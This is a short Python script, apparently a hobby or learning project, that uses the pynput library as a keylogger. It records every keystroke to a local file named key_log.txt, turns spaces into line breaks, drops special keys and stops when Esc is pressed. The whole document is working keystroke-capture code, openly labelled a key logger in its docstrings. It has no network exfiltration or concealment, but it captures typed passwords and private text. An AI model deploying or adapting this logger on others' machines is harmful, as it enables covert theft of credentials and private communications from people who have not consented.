from pynput.keyboard import Key, Listener

def on_press(key):

    """This function is to get the key strokes and print them on the console"""

    # print(f'{key} pressed')
    write_to_file(key)

def write_to_file(key):

    """This function is to wrtie all the key strokes in a structred way and getting rid of
    space and key word from the key strokes"""

    with open ("key_log.txt", 'a') as f:
        k = str(key).replace("'", "")

        if k.find("space") > 0:
            f.write('\n')

        elif k.find("Key") == -1:
            f.write(k)

def on_release(key):

    """This function is to stop the key logger when the esc key is pressed"""

    if key == Key.esc:
        return False

if __name__ == "__main__":
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
